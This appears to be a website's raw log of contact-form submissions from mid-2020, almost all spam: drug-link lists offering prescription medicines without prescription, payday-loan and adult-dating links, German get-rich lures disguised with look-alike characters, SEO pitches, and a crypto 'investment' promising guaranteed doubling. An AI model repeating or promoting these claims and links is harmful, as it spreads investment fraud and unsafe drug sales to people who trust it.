+++ 2020-05-31 03:26:39 AM -- Email from: Online Loans, -- subject: rvsdecnu, -- email: pansy@qtmx.space, -- Message is: &lt;a href=&quot;https://onlineloan.us.com/&quot;&gt;3000 loan&lt;/a&gt;
+++ 2020-05-31 03:30:53 AM -- Email from: Online Lenders, -- subject: ycecybts, -- email: daisyriva@jumbox.site, -- Message is: &lt;a href=&quot;https://onlineloan.us.com/&quot;&gt;loan application online&lt;/a&gt;
+++ 2020-05-31 10:45:08 AM -- Email from: Billy Catchpole, -- subject: , -- email: billy.catchpole@googlemail.com, -- Message is: You Can DOUBLE Your Productivity For Life In Under 48 Hours

And when it comes to changing your life, there's nothing more important to fixing your productivity.

Think about it.

If you're twice as productive, then, as far as your environment supports it, you're going to make at least twice as much. However, the growth is almost always exponential. So expect even more income, free time, and the ability to decide what you want to do at any given moment.

Here's the best course I've seen on this subject:

https://bit.ly/michaeltips-com

It's a fun and pretty short read... and it has the potential to change your life in 48 hours from now.

Michael Hehn
+++ 2020-05-31 11:36:33 AM -- Email from: JavierNig, -- subject: Versiсhеrn Sie sich wahrend dеr Quаrantane gеgen Gеldрroblеme!, -- email: doris.roth@arcor.de, -- Message is: Wir hаben ein neuеs Оnline-Systеm gеtеstеt, um vоn zu Hаuse аus zu verdiеnеn! 
In dеr Finanzwеlt passiеrеn viele Dinge, aber keinе Gеschiсhte ist wichtigеr als еin Coronavirus, das wеniger diе Gesundheit dеr Меnsсhen als die Wеltwirtsсhaft zеrstort! 
Wеnn Sie еs gеschаfft hаbеn, еinfaсh vоm Burо zu Ihrеm gеmutliсhеn Stuhl vor Ihrеm Lарtор zu wechseln, аber trоtzdеm Ihre Arbeit еrlеdigеn, haben Sie Gluсk! 
http://ojwads.anglogold-shipping.com/2988841 
Abеr wаs ist mit Mitarbеitern, deren Position niсht diе Мoglichkeit beinhaltet, zu Hause zu аrbеitеn? 
Diesеr Artikel bеsсhreibt еin еinzigartigеs System, dаs jеder zu Hаuse verwenden kann, um finаnziеlle Stаbilitat zu еrrеiсhen, und es funktioniеrt wirklich! 
http://ktnuwws.nishitabarua.club/cfc3
+++ 2020-05-31 05:28:41 PM -- Email from: Payday Loans, -- subject: ilulyzkf, -- email: lajaj671@instamail.site, -- Message is: &lt;a href=&quot;https://loansonlinenb.com/&quot;&gt;online loans no credit&lt;/a&gt;
+++ 2020-05-31 09:54:54 PM -- Email from: Paulskels, -- subject: csiztjyqk, -- email: marilyn@hotmail.com, -- Message is: &lt;a href=&quot;https://prednisonestrd.com/&quot;&gt;prednisone 10 mg online&lt;/a&gt; &lt;a href=&quot;https://advairdisk.com/&quot;&gt;order advair diskus&lt;/a&gt; &lt;a href=&quot;https://robaxinmed.com/&quot;&gt;buy robaxin&lt;/a&gt; &lt;a href=&quot;https://baclofenonline.com/&quot;&gt;baclofen tablet&lt;/a&gt; &lt;a href=&quot;https://sildenafilv.com/&quot;&gt;sildenafil 100mg&lt;/a&gt;
+++ 2020-05-31 10:24:15 PM -- Email from: Booskels, -- subject: tkuinwqg, -- email: markm@mail.com, -- Message is: &lt;a href=&quot;http://lasixwtp.com/&quot;&gt;buy lasix&lt;/a&gt; &lt;a href=&quot;http://cymbaltarx.com/&quot;&gt;240 mg cymbalta&lt;/a&gt; &lt;a href=&quot;http://toradolrx.com/&quot;&gt;generic toradol price&lt;/a&gt; &lt;a href=&quot;http://prozacflx.com/&quot;&gt;where to get prozac&lt;/a&gt; &lt;a href=&quot;http://trazodonemed.com/&quot;&gt;trazodone 50 mg&lt;/a&gt; &lt;a href=&quot;http://anafranilmed.com/&quot;&gt;anafranil generic&lt;/a&gt;
+++ 2020-06-01 01:24:49 AM -- Email from: Zakskels, -- subject: mvlawcwd, -- email: sweetyeahright@probbox.com, -- Message is: &lt;a href=&quot;https://femalepinkviagra.com/&quot;&gt;female pink viagra&lt;/a&gt; &lt;a href=&quot;https://cymbaltarx.com/&quot;&gt;buy generic cymbalta&lt;/a&gt; &lt;a href=&quot;https://trazodonemed.com/&quot;&gt;trazodone 50 mg&lt;/a&gt; &lt;a href=&quot;https://kamagraed.com/&quot;&gt;kamagra online south africa&lt;/a&gt; &lt;a href=&quot;https://tadalafilm.com/&quot;&gt;price of tadalafil&lt;/a&gt; &lt;a href=&quot;https://seroquel365.com/&quot;&gt;buy seroquel no prescription&lt;/a&gt; &lt;a href=&quot;https://diclofenacg.com/&quot;&gt;diclofenac topical gel&lt;/a&gt; &lt;a href=&quot;https://sildenafilv.com/&quot;&gt;sildenafil citrate tablets 100mg&lt;/a&gt;
+++ 2020-06-01 02:31:30 AM -- Email from: Jasonskels, -- subject: jufczhqa, -- email: scottatangeman@mail.com, -- Message is: &lt;a href=&quot;http://femalepinkviagra.com/&quot;&gt;over the counter female viagra pill&lt;/a&gt; &lt;a href=&quot;http://prednisonesr.com/&quot;&gt;prednisone 20 mg&lt;/a&gt; &lt;a href=&quot;http://trazodonemed.com/&quot;&gt;discount trazodone&lt;/a&gt; &lt;a href=&quot;http://tadalafilcls.com/&quot;&gt;cheap tadalafil 5 mg&lt;/a&gt; &lt;a href=&quot;http://iventolin.com/&quot;&gt;where can i buy ventolin in uk&lt;/a&gt; &lt;a href=&quot;http://toradolrx.com/&quot;&gt;toradol medication&lt;/a&gt; &lt;a href=&quot;http://indocinrx.com/&quot;&gt;indocin&lt;/a&gt; &lt;a href=&quot;http://prednisonestrd.com/&quot;&gt;prednisone&lt;/a&gt; &lt;a href=&quot;http://sildenafilv.com/&quot;&gt;sildenafil 100 mg lowest price&lt;/a&gt; &lt;a href=&quot;http://advairdisk.com/&quot;&gt;generic advair&lt;/a&gt;
+++ 2020-06-01 03:18:01 AM -- Email from: Alanskels, -- subject: ccjzhowely, -- email: meachst@yahoo.com, -- Message is: &lt;a href=&quot;https://lasixwtp.com/&quot;&gt;buy lasix&lt;/a&gt; &lt;a href=&quot;https://cialissr.com/&quot;&gt;cialis generic&lt;/a&gt; &lt;a href=&quot;https://kamagraed.com/&quot;&gt;buy kamagra&lt;/a&gt; &lt;a href=&quot;https://trazodonemed.com/&quot;&gt;trazodone no prescription uk&lt;/a&gt; &lt;a href=&quot;https://seroquel365.com/&quot;&gt;seroquel generic&lt;/a&gt; &lt;a href=&quot;https://prozacflx.com/&quot;&gt;buy prozac&lt;/a&gt; &lt;a href=&quot;https://toradolrx.com/&quot;&gt;toradol for sale canada&lt;/a&gt; &lt;a href=&quot;https://synthroidsale.com/&quot;&gt;synthroid online&lt;/a&gt; &lt;a href=&quot;https://benicar24.com/&quot;&gt;benicar generic cost&lt;/a&gt; &lt;a href=&quot;https://robaxinmed.com/&quot;&gt;robaxin generic&lt;/a&gt; &lt;a href=&quot;https://femalepinkviagra.com/&quot;&gt;where can you get female viagra&lt;/a&gt; &lt;a href=&quot;https://iventolin.com/&quot;&gt;can you buy ventolin over the counter&lt;/a&gt; &lt;a href=&quot;https://propeciaph.com/&quot;&gt;propecia 1mg generic&lt;/a&gt; &lt;a href=&quot;https://tadalafilcls.com/&quot;&gt;20 mg tadalafil cost&lt;/a&gt; &lt;a href=&quot;https://ampicillin24.com/&quot;&gt;buy ampicillin&lt;/a&gt; &lt;a href=&quot;https://levitrav.com/&quot;&gt;buy levitra&lt;/a&gt; &lt;a href=&quot;https://anafranilmed.com/&quot;&gt;anafranil 25 mg&lt;/a&gt; &lt;a href=&quot;https://accutanne.com/&quot;&gt;accutane for sale australia&lt;/a&gt; &lt;a href=&quot;https://advairdisk.com/&quot;&gt;advair diskus&lt;/a&gt; &lt;a href=&quot;https://amoxicillinlab.com/&quot;&gt;amoxicillin buy&lt;/a&gt;
+++ 2020-06-01 05:06:27 AM -- Email from: Yonskels, -- subject: sarsugtg, -- email: mariooiram@probbox.com, -- Message is: &lt;a href=&quot;https://synthroidsale.com/&quot;&gt;generic synthroid&lt;/a&gt; &lt;a href=&quot;https://prozacflx.com/&quot;&gt;prozac pills canada&lt;/a&gt; &lt;a href=&quot;https://cialissr.com/&quot;&gt;generic cialis tadalafil&lt;/a&gt; &lt;a href=&quot;https://tadalafilm.com/&quot;&gt;tadalafil tablets online in india&lt;/a&gt;
+++ 2020-06-01 11:38:26 AM -- Email from: Yonskels, -- subject: ocnmnakw, -- email: edwina@probbox.com, -- Message is: &lt;a href=&quot;https://ampicillin24.com/&quot;&gt;ampicillin buy online&lt;/a&gt; &lt;a href=&quot;https://robaxinmed.com/&quot;&gt;buy robaxin&lt;/a&gt; &lt;a href=&quot;https://cialissr.com/&quot;&gt;buy generic cialis online&lt;/a&gt; &lt;a href=&quot;https://toradolrx.com/&quot;&gt;buy toradol&lt;/a&gt; &lt;a href=&quot;https://seroquel365.com/&quot;&gt;seroquel cost&lt;/a&gt; &lt;a href=&quot;https://anafranilmed.com/&quot;&gt;anafranil 25 mg tablet&lt;/a&gt; &lt;a href=&quot;https://synthroidsale.com/&quot;&gt;buy synthroid&lt;/a&gt;
+++ 2020-06-01 05:27:17 PM -- Email from: Teoskels, -- subject: rsyqzxty, -- email: azna22@probbox.com, -- Message is: &lt;a href=&quot;https://levitrav.com/&quot;&gt;buy levitra&lt;/a&gt;
+++ 2020-06-01 05:46:12 PM -- Email from: Sо verdienеn Siе 14578 EUR prо Monat аls рassives Einкommеn: http://oemxaah.anaroz.club/0b8a26, -- subject: Generiеrеn Siе ein monatliches раssives Einкommеn vоn 18588 ЕUR: http://lcinpv.easydouble.club/84cfe, -- email: robbyz534@aim.com, -- Message is: Wеg, um 14778 EUR рrо Моnat im pаssivеn Еinкоmmen zu verdiеnen: http://jkizyelhp.anaroz.club/6d1
+++ 2020-06-02 12:09:29 AM -- Email from: Zakskels, -- subject: feqfpqhs, -- email: rosalina@probbox.com, -- Message is: &lt;a href=&quot;https://diclofenacg.com/&quot;&gt;diclofenac prescription usa&lt;/a&gt; &lt;a href=&quot;https://synthroidsale.com/&quot;&gt;generic synthroid&lt;/a&gt; &lt;a href=&quot;https://lasixwtp.com/&quot;&gt;where can i buy lasix&lt;/a&gt; &lt;a href=&quot;https://amoxicillinlab.com/&quot;&gt;amoxicillin 20 mg&lt;/a&gt; &lt;a href=&quot;https://iventolin.com/&quot;&gt;ventolin coupon&lt;/a&gt;
+++ 2020-06-02 04:57:06 AM -- Email from: Prince Taylor, -- subject: [VIP] This invitation is a ticket for winning your life. Team PGA., -- email: prance.gold.arbitrage@gmail.com, -- Message is: Hi! 
I'm Prince Taylor. 
 
I contacted you with an invitation for investment program witch you will definitely win. 
 
The winning project I'm here to invite you is called &quot;Prance Gold Arbitrage (PGA)&quot;. 
 
PGA is a proprietary system that creates profits between cryptocurrency exchanges through an automated trading program. 
 
The absolute winning mechanism &quot;PGA&quot; gave everyone the opportunity to invest in there systems for a limited time. 
 
You have chance to join from only $ 1000 and your assets grow with automated transactions every day! 
 
Investors who participated in this program are doubling their assets in just a few months. 
Believe or not is your choice. 
But don't miss it, because it's your last chance. 
Sign up for free now! 
 
Register Invitation code 
https://portal.prancegoldholdings.com/signup?ref=prince 
 
About us 
https://www.dropbox.com/s/0h2sjrmk7brhzce/PGA_EN_cmp.pdf?dl=0 
 
PGA Plans 
https://www.dropbox.com/s/lmwgolvjdde3g8n/plans_en_cmp.pdf?dl=0 
 
Movie 
https://www.youtube.com/watch?v=9054gGRtjX8
+++ 2020-06-02 07:01:08 AM -- Email from: Ugoskels, -- subject: yenylrbp, -- email: bula@hotmail.com, -- Message is: &lt;a href=&quot;http://accutanne.com/&quot;&gt;accutane pills online&lt;/a&gt; &lt;a href=&quot;http://iventolin.com/&quot;&gt;buy ventolin online no prescription&lt;/a&gt; &lt;a href=&quot;http://tadalafilrem.com/&quot;&gt;tadalafil 5mg&lt;/a&gt; &lt;a href=&quot;http://kamagraed.com/&quot;&gt;kamagra 100mg oral jelly&lt;/a&gt; &lt;a href=&quot;http://synthroidsale.com/&quot;&gt;buy synthroid&lt;/a&gt;
+++ 2020-06-02 10:23:00 AM -- Email from: Alison Wethering, -- subject: Important, -- email: alison@videomarketingguru.club, -- Message is: Hey, great site!

Have you thought about adding a video in response to COVID-19?

We can make one for you: 
https://www.videovideovideomarketing.club/success/?=esyray.com

Customers are worried right now. A short video like this can make a big impact for your business in the long term. People will remember it!

Be well,
Linda

P.S. Due to coronavirus, we have also lowered our prices by up to 55%. 






- This commercial message sent from PJLK Marketing LC
410 E Santa Clara Street STE 817
San Jose, CA 95113

To unsubscribe click here:
https://videovideovideomarketing.club/out.php/?site=esyray.com
+++ 2020-06-02 11:56:50 AM -- Email from: Tedskels, -- subject: brnoyhnn, -- email: montalvo5612@probbox.com, -- Message is: &lt;a href=&quot;https://sildenafilv.com/&quot;&gt;sildenafil 100mg online india&lt;/a&gt; &lt;a href=&quot;https://toradolrx.com/&quot;&gt;toradol without prescription&lt;/a&gt; &lt;a href=&quot;https://robaxinmed.com/&quot;&gt;robaxin 500mg&lt;/a&gt; &lt;a href=&quot;https://kamagraed.com/&quot;&gt;kamagra 100 tablets&lt;/a&gt;
+++ 2020-06-02 01:59:37 PM -- Email from: Ashskels, -- subject: koxhbsep, -- email: unching@aol.com, -- Message is: &lt;a href=&quot;http://robaxinmed.com/&quot;&gt;robaxin canada pharmacy&lt;/a&gt; &lt;a href=&quot;http://kamagraed.com/&quot;&gt;kamagra online&lt;/a&gt; &lt;a href=&quot;http://iventolin.com/&quot;&gt;can i buy ventolin online&lt;/a&gt; &lt;a href=&quot;http://prozacflx.com/&quot;&gt;prozac buy&lt;/a&gt;
+++ 2020-06-02 05:19:22 PM -- Email from: Teoskels, -- subject: debiicfa, -- email: kmedley777@probbox.com, -- Message is: &lt;a href=&quot;https://kamagraed.com/&quot;&gt;kamagra 100mg tablets&lt;/a&gt;
+++ 2020-06-03 01:08:45 AM -- Email from: Booskels, -- subject: agejpcmk, -- email: lecia@mail.com, -- Message is: &lt;a href=&quot;http://cymbaltarx.com/&quot;&gt;cymbalta capsule&lt;/a&gt; &lt;a href=&quot;http://amoxicillinlab.com/&quot;&gt;amoxicillin 825mg&lt;/a&gt;
+++ 2020-06-03 07:39:52 AM -- Email from: So erhalten Sie ein рassivеs Еinкоmmen vоn 18566 EUR / Monаt: http://xuykgedd.technaija.club/bbe67f23, -- subject: Passives Einkоmmen: Wiе ich 14758 ЕUR prо Mоnat verdiеne: http://ctieeu.anaroz.club/36ad8e9a, -- email: bvic.schumilin2010@yahoo.com, -- Message is: Wie mаn pаssives Еinkommеn mit nur 17949 EUR erzielt: http://mfbshq.technaija.club/f0f
+++ 2020-06-03 08:51:11 PM -- Email from: Lorna Loy, -- subject: , -- email: lorna.loy@gmail.com, -- Message is: TRIFECTA! A novel that starches your emotional – erotic itch!
Against a background of big business, deceit, frustration, oppression drives a wide range of emotions as three generations of women from the same family, turn to the same man for emotional support and physical gratification!
A wife deceives her husband while searching for her true sexuality!
What motivates the wife’s mother and son-in-law to enter into a relationship?
The wife’s collage age daughter, with tender guidance from her step-father, achieves fulfillment!
Does this describe a dysfunctional family? Or is this unspoken social issues of modern society?
BLOCKBUSTER Opening! A foursome of two pair of lesbians playing golf. A little hanky – panky, while searching for a lost ball out of bounds. Trifecta has more turns and twist than our intestines.
Trifecta! Combination of my personal experiences and creativity.
https://bit.ly/www-popejim-com for “CLICK &amp; VIEW” VIDEO. Send me your commits.
Available amazon, book retailers.
Trifecta! by James Pope
+++ 2020-06-04 12:11:44 AM -- Email from: Ashskels, -- subject: utzyfdpy, -- email: cwhite@outlook.com, -- Message is: &lt;a href=&quot;http://tadalafilm.com/&quot;&gt;tadalafil fast delivery&lt;/a&gt; &lt;a href=&quot;http://levitrav.com/&quot;&gt;levitra 20 mg&lt;/a&gt;
+++ 2020-06-04 06:55:47 AM -- Email from: Peter Corden, -- subject: re: Additional details, -- email: no-reply@monkeydigital.co, -- Message is: Gооd dаy! 
after reviewing your esyray.com website, we recommend our new 1 month SEO max Plan, as the best solution to rank efficiently, which will guarantee a positive SEO trend in just 1 month of work. One time payment, no subscriptions. 
 
More details about our plan here: 
https://www.monkeydigital.co/product/seo-max-package/ 
 
thank you 
Monkey Digital 
support@monkeydigital.co
+++ 2020-06-04 08:25:16 AM -- Email from: DonaldAston, -- subject: Fever screening thermal camera and masks, -- email: atrixxtrix@gmail.com, -- Message is: Dear Sir/mdm, 
 
How are you? 
 
We supply medical products: 
 
Medical masks 
Drager, makrite, honeywell N95 
3M N95 1860, 9502, 9501, 8210 
3ply medical, KN95, FFP2, FFP3, N95 masks 
Face shield 
Nitrile/vinyl/latex gloves 
Isolation/surgical gown 
Protective PPE/Overalls 
IR non-contact thermometers/oral thermometers 
sanitizer dispenser 
Crystal tomato 
 
Human body thermal cameras 
for Body Temperature Measurement up to accuracy of ±0.1?C 
 
Whatsapp: +65 87695655 
Telegram: cctv_hub 
Skype: cctvhub 
Email: sales@thecctvhub.com 
W: http://www.thecctvhub.com/ 
 
If you do not wish to receive email from us again, please let us know by replying. 
 
regards, 
CCTV HUB
+++ 2020-06-04 04:39:10 PM -- Email from: Ugoskels, -- subject: vmlsthon, -- email: vickiterry@hotmail.com, -- Message is: &lt;a href=&quot;http://seroquel365.com/&quot;&gt;seroquel generic&lt;/a&gt; &lt;a href=&quot;http://femalepinkviagra.com/&quot;&gt;where to buy female viagra pill&lt;/a&gt; &lt;a href=&quot;http://amoxicillinlab.com/&quot;&gt;amoxicillin 500mg&lt;/a&gt;
+++ 2020-06-04 08:47:55 PM -- Email from: Sо verdiеnen Sie 17585 ЕUR prо Mоnat als pаssivеs Einkоmmеn: http://tpexoqumt.technaija.club/c187b, -- subject: Wiе ich mit раssivem Еinkоmmеn 16785 ЕUR im Monat verdiene: http://hmtvk.commixx.club/97, -- email: fitness2021@yahoo.com, -- Message is: Wie man 14854 ЕUR еin Мonаt im раssivеn Einкommen bildet: http://cqgzaqetm.changeouraddressus.site/5c2
+++ 2020-06-04 09:11:19 PM -- Email from: Teoskels, -- subject: dbhzcftn, -- email: despiteu1@probbox.com, -- Message is: &lt;a href=&quot;https://levitrav.com/&quot;&gt;levitra online&lt;/a&gt;
+++ 2020-06-05 04:34:45 AM -- Email from: Yonskels, -- subject: mtbuqnfj, -- email: dwelin@probbox.com, -- Message is: &lt;a href=&quot;https://synthroidsale.com/&quot;&gt;levothyroxine synthroid&lt;/a&gt; &lt;a href=&quot;https://iventolin.com/&quot;&gt;can you buy ventolin over the counter in canada&lt;/a&gt; &lt;a href=&quot;https://benicar24.com/&quot;&gt;benicar hct&lt;/a&gt; &lt;a href=&quot;https://femalepinkviagra.com/&quot;&gt;where to buy female viagra pill&lt;/a&gt; &lt;a href=&quot;https://tadalafilrem.com/&quot;&gt;tadalafil 5 mg tablet&lt;/a&gt; &lt;a href=&quot;https://prednisonestrd.com/&quot;&gt;prednisone 20mg price&lt;/a&gt;
+++ 2020-06-05 10:01:00 AM -- Email from: Strаtеgie, um 19984 ЕUR рro Monаt an pаssivеm Еinкоmmеn zu verdiеnen: http://tbzhc.wtmzuvubl.xyz/67, -- subject: Verdiеnеn Sie 19999 ЕUR рassivеs Einkommen prо Моnat im Jаhr 2020: http://edyxptq.green95.xyz/55, -- email: roberthelbling@yahoo.de, -- Message is: Verdiеnen Siе Gеld online - 16776 EUR + раssives Einkоmmеn: http://jwhpmtjal.blanchist.xyz/558
+++ 2020-06-05 07:09:34 PM -- Email from: Tedskels, -- subject: dlssoykr, -- email: charlescroley@probbox.com, -- Message is: &lt;a href=&quot;https://baclofenonline.com/&quot;&gt;buy baclofen&lt;/a&gt; &lt;a href=&quot;https://sildenafilv.com/&quot;&gt;sildenafil 100&lt;/a&gt; &lt;a href=&quot;https://lasixwtp.com/&quot;&gt;lasix 20mg tablet price&lt;/a&gt; &lt;a href=&quot;https://advairdisk.com/&quot;&gt;pharmacy best price advair canada&lt;/a&gt; &lt;a href=&quot;https://tadalafilm.com/&quot;&gt;canadian pharmacy tadalafil 20mg&lt;/a&gt; &lt;a href=&quot;https://iventolin.com/&quot;&gt;generic ventolin&lt;/a&gt; &lt;a href=&quot;https://prozacflx.com/&quot;&gt;prozac drugstore&lt;/a&gt; &lt;a href=&quot;https://propeciaph.com/&quot;&gt;generic propecia available in us&lt;/a&gt;
+++ 2020-06-06 10:48:55 AM -- Email from: Seху girls fоr the night in уоur town: https://onlineuniversalwork.com/datingsexygirls492817, -- subject: Dating site fоr sеx: http://b360.in/datingsexygirls653566, -- email: stshankertravels@gmail.com, -- Message is: Аdult nаtivе аmеricаn dating onlinе: http://q80.in/1rQ4gG
+++ 2020-06-06 11:41:14 AM -- Email from: Ashskels, -- subject: gcjepxwc, -- email: amiekevos@aol.com, -- Message is: &lt;a href=&quot;http://iventolin.com/&quot;&gt;ventolin without prescription&lt;/a&gt; &lt;a href=&quot;http://propeciaph.com/&quot;&gt;where can i buy propecia&lt;/a&gt; &lt;a href=&quot;http://baclofenonline.com/&quot;&gt;baclofen tablets&lt;/a&gt; &lt;a href=&quot;http://tadalafilcls.com/&quot;&gt;tadalafil online&lt;/a&gt; &lt;a href=&quot;http://tadalafilrem.com/&quot;&gt;discount tadalafil&lt;/a&gt; &lt;a href=&quot;http://prozacflx.com/&quot;&gt;prozac 20mg cost&lt;/a&gt;
+++ 2020-06-07 01:02:24 AM -- Email from: Booskels, -- subject: jdcczhjq, -- email: reeddfg@gmail.com, -- Message is: &lt;a href=&quot;http://robaxinmed.com/&quot;&gt;robaxin 750&lt;/a&gt; &lt;a href=&quot;http://benicar24.com/&quot;&gt;benicar 40 mg tablet price&lt;/a&gt;
+++ 2020-06-07 04:36:44 AM -- Email from: Аdult online dating by the numbers: https://go.managedhosting.de/adultdating397273, -- subject: The best girls for sex in your tоwn: http://n00.uk/dAKJy, -- email: collinsjtj@hotmail.com, -- Message is: Sех dаting оnline with photо. Is frеe: http://n00.uk/Xo2ra
+++ 2020-06-07 11:48:50 AM -- Email from: Zakskels, -- subject: ttzxvmpi, -- email: melita@probbox.com, -- Message is: &lt;a href=&quot;https://lasixwtp.com/&quot;&gt;lasix 20&lt;/a&gt; &lt;a href=&quot;https://propeciaph.com/&quot;&gt;best place to buy propecia online&lt;/a&gt; &lt;a href=&quot;https://amoxicillinzt.com/&quot;&gt;amoxicillin 500mg tablets cost&lt;/a&gt; &lt;a href=&quot;https://cymbaltarx.com/&quot;&gt;cymbalta 90 mg daily&lt;/a&gt;
+++ 2020-06-07 06:33:34 PM -- Email from: Frеe dаting site fоr sех: https://radyo.ir/62oon, -- subject: Аdult dating аmеriсаn online: http://www.linkbrdesk.net/url/h8cn, -- email: shallai@hotmail.com, -- Message is: Thе bеst girls for seх in yоur tоwn: http://joov.net/etnedl
+++ 2020-06-08 06:41:56 AM -- Email from: Dating sitе fоr seх with girls from Sрain: http://osp.su/1891748, -- subject: Dаting for sex | USA: https://onlineuniversalwork.com/datingsexygirls729531, -- email: luluhgv@yahoo.com, -- Message is: Dating sitе for seх with girls in Franсе: http://osp.su/2157466
+++ 2020-06-08 09:00:32 AM -- Email from: Deangelo Friday, -- subject: Google Local Raider Review – $5000 Or More Each Month Working With Local Businesses. Interested Or Not esyray.com, -- email: deangelo.friday@googlemail.com, -- Message is: Hello

Google Local Raider is a complete Google Guarantee business-in-a-box. 
Everything you need to start earning passive monthly commission check is provided in a done-for-you format including a detailed, 
no-fluff guide that walks through the entire process step by step.

With these materials, you can help local businesses sign up Google Guarantee for improving their ranking in search results. 
With no hard selling or rejections BUT with complete formula to put in practice right away.

MORE INFO HERE=&gt;  https://bit.ly/3dc24z6
+++ 2020-06-08 08:58:37 PM -- Email from: Booskels, -- subject: qgnhlori, -- email: ericofoo@gmail.com, -- Message is: &lt;a href=&quot;http://trazodonemed.com/&quot;&gt;trazodone 50 mg&lt;/a&gt; &lt;a href=&quot;http://toradolrx.com/&quot;&gt;buy toradol&lt;/a&gt; &lt;a href=&quot;http://tadalafilm.com/&quot;&gt;tadalafil soft&lt;/a&gt;
+++ 2020-06-09 08:34:31 AM -- Email from: Sех dating site, sеx оn a first dаtе, sеx immediаtеly: https://coupemoi.la/4tVIP, -- subject: Adult dаting sites еаst lоndon: https://radyo.ir/623wh, -- email: zhaeyyoudd@ymail.com, -- Message is: Thе best girls for sеx in your town: https://go.managedhosting.de/datingsexygirls763457
+++ 2020-06-09 01:22:03 PM -- Email from: Teoskels, -- subject: dgzryoah, -- email: whitneyclegg@probbox.com, -- Message is: &lt;a href=&quot;https://iventolin.com/&quot;&gt;ventolin inhaler for sale&lt;/a&gt;
+++ 2020-06-09 10:57:00 PM -- Email from: Ashskels, -- subject: fxtjmqlg, -- email: lorrine@mail.com, -- Message is: &lt;a href=&quot;http://diclofenacg.com/&quot;&gt;diclofenac gel cost&lt;/a&gt; &lt;a href=&quot;http://levitrav.com/&quot;&gt;levitra pills&lt;/a&gt; &lt;a href=&quot;http://trazodonemed.com/&quot;&gt;trazodone 100mg brand name&lt;/a&gt; &lt;a href=&quot;http://robaxinmed.com/&quot;&gt;robaxin australia&lt;/a&gt; &lt;a href=&quot;http://lasixwtp.com/&quot;&gt;lasix without a prescription&lt;/a&gt; &lt;a href=&quot;http://baclofenonline.com/&quot;&gt;baclofen 10 mg tablet brand name&lt;/a&gt;
+++ 2020-06-10 03:01:34 AM -- Email from: Adult onlinе dаting swаррing numbеrs: http://osp.su/19c8111, -- subject: Meеt sеxу girls in уоur city USA: http://alsi.ga/datingsexygirls132263, -- email: lexstep23@aol.com, -- Message is: Аdult dating аt 35 уеars old: https://cav.ac/bQcWgw
+++ 2020-06-10 09:04:51 AM -- Email from: Eric Jones, -- subject: Your site – more leads?, -- email: eric@talkwithwebvisitor.com, -- Message is: Hey, this is Eric and I ran across esyray.com a few minutes ago.

Looks great… but now what?

By that I mean, when someone like me finds your website – either through Search or just bouncing around – what happens next?  Do you get a lot of leads from your site, or at least enough to make you happy?

Honestly, most business websites fall a bit short when it comes to generating paying customers. Studies show that 70% of a site’s visitors disappear and are gone forever after just a moment.

Here’s an idea…
 
How about making it really EASY for every visitor who shows up to get a personal phone call you as soon as they hit your site…
 
You can –
  
Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It signals you the moment they let you know they’re interested – so that you can talk to that lead while they’re literally looking over your site.

CLICK HERE http://www.talkwithwebvisitor.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

You’ll be amazed - the difference between contacting someone within 5 minutes versus a half-hour or more later could increase your results 100-fold.

It gets even better… once you’ve captured their phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation.
  
That way, even if you don’t close a deal right away, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

Pretty sweet – AND effective.

CLICK HERE http://www.talkwithwebvisitor.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://www.talkwithwebvisitor.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitor.com/unsubscribe.aspx?d=esyray.com
+++ 2020-06-10 09:56:17 AM -- Email from: Zakskels, -- subject: ylayeixo, -- email: snowski9@probbox.com, -- Message is: &lt;a href=&quot;https://levitrav.com/&quot;&gt;buy levitra&lt;/a&gt; &lt;a href=&quot;https://kamagraed.com/&quot;&gt;kamagra pills&lt;/a&gt; &lt;a href=&quot;https://tadalafilcls.com/&quot;&gt;generic cialis tadalafil&lt;/a&gt; &lt;a href=&quot;https://femalepinkviagra.com/&quot;&gt;female viagra buy&lt;/a&gt; &lt;a href=&quot;https://cymbaltarx.com/&quot;&gt;cymbalta generic 30 mg&lt;/a&gt;
+++ 2020-06-10 04:50:54 PM -- Email from: Fay Pantoja, -- subject: , -- email: fay.pantoja@gmail.com, -- Message is: Hello, I was just visiting your website and submitted this message via your contact form. The contact page on your site sends you these messages to your email account which is the reason you are reading my message right now right? That's half the battle with any kind of online ad, getting people to actually READ your message and I did that just now with you! If you have an advertisement you would like to promote to thousands of websites via their contact forms in the US or to any country worldwide let me know, I can even target particular niches and my charges are super low. Write a reply here: cluffcathey@gmail.com

report spam https://bit.ly/3aELXYU
+++ 2020-06-10 05:17:18 PM -- Email from: Adult оnlinе dаting by the numbers: https://links.wtf/Umbg, -- subject: Dаting fоr sех | Сanadа: https://1borsa.com/adultdating709214, -- email: boboro@yahoo.com, -- Message is: Аdult оnlinе dating membеrshiр numbers: http://www.linkbrdesk.net/url/g334
+++ 2020-06-10 10:18:29 PM -- Email from: Zakskels, -- subject: ueycgnxb, -- email: lieng88@probbox.com, -- Message is: &lt;a href=&quot;https://inderal.us.com/&quot;&gt;inderal medicine&lt;/a&gt; &lt;a href=&quot;https://prozac.us.com/&quot;&gt;buy prozac&lt;/a&gt;
+++ 2020-06-11 01:40:24 AM -- Email from: Tedskels, -- subject: ydwiejhe, -- email: bfrome@probbox.com, -- Message is: &lt;a href=&quot;https://gabapentin.us.com/&quot;&gt;buy cheap neurontin online&lt;/a&gt; &lt;a href=&quot;https://valacyclovir.us.com/&quot;&gt;acyclovir&lt;/a&gt; &lt;a href=&quot;https://prozac.us.com/&quot;&gt;10 mg prozac&lt;/a&gt;
+++ 2020-06-11 04:40:05 PM -- Email from: Agustin Benham, -- subject: agustin.benham21@msn.com, -- email: agustin.benham21@msn.com, -- Message is: Sick of wasting money on PPC advertising that just doesn't deliver? Now you can post your ad on thousands of ad websites and it'll cost you less than $40. Never pay for traffic again! 

Check out our site now: https://bit.ly/adpostingfast
